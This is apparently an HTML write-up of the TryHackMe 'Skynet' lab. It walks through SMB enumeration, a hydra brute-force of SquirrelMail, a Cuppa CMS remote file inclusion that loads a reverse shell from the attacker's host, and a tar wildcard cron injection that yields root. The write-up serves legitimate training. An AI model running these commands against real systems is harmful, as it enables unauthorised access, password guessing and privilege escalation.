@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Skynet — TryHackMe walkthrough</title>
+<meta name="description" content="Walkthrough for the Skynet room on TryHackMe: SMB enumeration, SquirrelMail brute-force, Cuppa CMS remote file inclusion, and tar wildcard privilege escalation." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/skynet.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> TryHackMe</div>
+    <h1><em>Skynet</em></h1>
+    <div class="wt-meta">
+      <span class="badge medium">Medium</span>
+      <span class="badge tag">linux</span>
+      <span class="badge tag">smb</span>
+      <span class="badge tag">rfi</span>
+      <span class="badge tag">tar-wildcard</span>
+    </div>
+    <p class="wt-summary">
+      A multi-vector Terminator-themed box that exercises nearly every OSCP-style pattern:
+      anonymous SMB, webmail brute-force, pivoting through mail to another SMB share,
+      a Cuppa CMS remote file inclusion, and a tar wildcard injection against a root cron.
+      One of THM's most complete intermediate Linux rooms.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#smb">Anonymous SMB &amp; password wordlist</a></li>
+      <li><a href="#mail">SquirrelMail brute-force</a></li>
+      <li><a href="#miles">milesdyson SMB share</a></li>
+      <li><a href="#rfi">Cuppa CMS RFI → shell</a></li>
+      <li><a href="#privesc">tar wildcard injection → root</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.X.X -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu
+993/tcp open  ssl/imap    Dovecot imapd
+995/tcp open  ssl/pop3    Dovecot pop3d</code></pre>
+
+  <p>Plenty to work with. Web, SMB, and mail services — pick the lowest-hanging fruit (SMB) first.</p>
+
+  <h2 id="smb"><span class="num">02</span> Anonymous SMB &amp; password wordlist</h2>
+
+  <pre><code>smbclient -N -L \\\\10.10.X.X\\</code></pre>
+  <pre class="output"><code>Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+anonymous       Disk      Skynet Anonymous Share
+milesdyson      Disk      Miles Dyson Personal Share
+IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))</code></pre>
+
+  <p><code>anonymous</code> is accessible with no password. <code>milesdyson</code> requires auth. Grab everything from anonymous:</p>
+
+  <pre><code>smbclient -N \\\\10.10.X.X\\anonymous
+smb: \&gt; prompt off
+smb: \&gt; recurse on
+smb: \&gt; mget *</code></pre>
+
+  <p>Contents:</p>
+  <pre class="output"><code>attention.txt
+logs/log1.txt
+logs/log2.txt
+logs/log3.txt</code></pre>
+
+  <p><code>attention.txt</code> complains about stolen passwords and staff changing them. <code>log1.txt</code> is the prize — a list of ~250 passwords. We'll use it as a custom wordlist.</p>
+
+  <h2 id="mail"><span class="num">03</span> SquirrelMail brute-force</h2>
+
+  <p>Browse the web app at <code>http://10.10.X.X/</code> — a Cyberdyne/Skynet themed search UI, nothing directly exploitable. Fuzz:</p>
+
+  <pre><code>gobuster dir -u http://10.10.X.X/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html -t 40</code></pre>
+
+  <p>Notable hits: <code>/squirrelmail</code>, <code>/admin</code>, <code>/config</code>, <code>/ai</code>.</p>
+
+  <p>SquirrelMail login is at <code>/squirrelmail/src/login.php</code> and posts to <code>/squirrelmail/src/redirect.php</code>. The only local user mentioned so far is <code>milesdyson</code> — use it with the <code>log1.txt</code> wordlist:</p>
+
+  <pre class="exploit"><code>hydra -l milesdyson -P log1.txt 10.10.X.X \
+  http-post-form \
+  "/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password"</code></pre>
+
+  <div class="note">
+    If the failure string doesn't match on your instance, grab it yourself: submit a bad password from the browser, copy the exact error-page text (e.g. <em>"Unknown user or password incorrect"</em>), and use that as the final colon-separated field in the hydra command.
+  </div>
+
+  <p>After a minute or two, hydra returns a valid password (on my instance: <code>cyborg007haloterminator</code> — yours may differ if the box has been reset with a new wordlist order, but it's always in <code>log1.txt</code>).</p>
+
+  <p>Log into SquirrelMail. The inbox has three emails; the second or third one contains the new SMB password for <code>milesdyson</code> — a long random string. <strong>Copy it exactly.</strong></p>
+
+  <h2 id="miles"><span class="num">04</span> milesdyson SMB share</h2>
+
+  <pre><code>smbclient //10.10.X.X/milesdyson -U milesdyson
+# password: &lt;from email&gt;</code></pre>
+
+  <p>The share contains a mountain of research notes. The interesting ones are in <code>notes/</code> — specifically <code>important.txt</code>, which mentions Miles's private website with a hardcoded directory name:</p>
+
+  <pre class="output"><code>&lt;snip&gt;
+1.   Add features to beta CMS /45kra24zxs28v3yd
+2.   Work on T-800 Model 101 blueprints
+&lt;/snip&gt;</code></pre>
+
+  <p>Visit <code>http://10.10.X.X/45kra24zxs28v3yd/</code> — Miles's personal blog. Fuzz from there:</p>
+
+  <pre><code>gobuster dir -u http://10.10.X.X/45kra24zxs28v3yd/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></pre>
+
+  <p><code>/administrator</code> shows up — a <strong>Cuppa CMS</strong> login. Cuppa is ancient and has a well-known RFI in <code>alertConfigField.php</code>.</p>
+
+  <h2 id="rfi"><span class="num">05</span> Cuppa CMS RFI → shell</h2>
+
+  <p>The vulnerable endpoint takes a URL in <code>urlConfig</code> and includes it without sanitisation:</p>
+
+  <pre class="exploit"><code>http://10.10.X.X/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;attacker&gt;:8000/shell.php</code></pre>
+
+  <p>Prepare a PHP reverse shell locally — I use pentestmonkey's, edit the IP and port at the top:</p>
+
+  <pre><code>cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+sed -i 's/127.0.0.1/10.X.X.X/; s/1234/4444/' shell.php
+python3 -m http.server 8000</code></pre>
+
+  <p>Start a listener:</p>
+  <pre><code>nc -lnvp 4444</code></pre>
+
+  <p>Trigger the RFI:</p>
+  <pre><code>curl "http://10.10.X.X/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.X.X.X:8000/shell.php"</code></pre>
+
+  <p>Shell lands as <code>www-data</code>. Stabilise:</p>
+  <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl-Z; stty raw -echo; fg; export TERM=xterm</code></pre>
+
+  <p>We already have milesdyson's password from the email. Promote:</p>
+  <pre><code>su milesdyson
+# &lt;password from email&gt;
+cat /home/milesdyson/user.txt</code></pre>
+
+  <h2 id="privesc"><span class="num">06</span> tar wildcard injection → root</h2>
+
+  <p>Enumerate cron and scheduled tasks — easiest with <code>pspy</code>, but <code>cat /etc/crontab</code> works too:</p>
+
+  <pre><code>cat /etc/crontab</code></pre>
+  <pre class="output"><code>*/1 * * * * root /home/milesdyson/backups/backup.sh</code></pre>
+
+  <p>A root cron running every minute. Inspect the script:</p>
+  <pre><code>cat /home/milesdyson/backups/backup.sh</code></pre>
+  <pre class="output"><code>#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *</code></pre>
+
+  <p>Classic <strong>tar wildcard injection</strong>: the glob expansion passes any file matching <code>*</code> to tar as an argument, and GNU tar treats filenames starting with <code>--</code> as options. Two flags let us exec a command at "checkpoint" time.</p>
+
+  <p>We need to write these into <code>/var/www/html</code>. Check permissions — on Skynet, <code>/var/www/html</code> is owned by <code>www-data</code>, so drop into the <code>www-data</code> shell (the original RFI shell) rather than the <code>milesdyson</code> session.</p>
+
+  <p>Prepare a payload script:</p>
+
+  <pre class="exploit"><code># as www-data
+cd /var/www/html
+
+cat &gt; shell.sh &lt;&lt;'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+EOF
+chmod +x shell.sh
+
+# Create files whose names become tar arguments
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"</code></pre>
+
+  <p>Within 60 seconds the cron fires; <code>tar</code> expands the wildcard, picks up the <code>--checkpoint*</code> files as options, and runs <code>sh shell.sh</code> as root. That drops a SUID copy of <code>bash</code> in <code>/tmp</code>. Confirm and escalate:</p>
+
+  <pre><code>ls -la /tmp/rootbash
+# -rwsr-sr-x 1 root root ... /tmp/rootbash
+/tmp/rootbash -p
+# id → euid=0(root)
+cat /root/root.txt</code></pre>
+
+  <div class="note">
+    If the cron doesn't seem to trigger, double-check the script content (<code>cat /home/milesdyson/backups/backup.sh</code>) — some Skynet revisions tweak the path or the tar invocation. Adjust the target directory to wherever the wildcard expansion actually happens.
+  </div>
+
+  <h2><span class="num">07</span> Wrap-up</h2>
+
+  <p>The chain in one sentence: anonymous SMB → wordlist for webmail brute-force → authenticated SMB share reveals hidden URL → Cuppa CMS RFI → www-data → tar wildcard injection on a root cron.</p>
+
+  <p>Patterns worth internalising:</p>
+  <ul>
+    <li><strong>Always</strong> list SMB shares anonymously on any box that exposes 445.</li>
+    <li>Weak webmail + custom dictionary = fastest path to a real user.</li>
+    <li>GTFOBins exists for a reason — <code>tar</code>, <code>find</code>, <code>vim</code>, <code>perl</code> as wildcard / SUID / cap targets are frequent.</li>
+    <li>Any wildcard in a script running as root is a red flag; options can be smuggled in as filenames.</li>
+  </ul>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>TryHackMe · Skynet</div>
+  </footer>
+
+</div>
+</body>
+</html>
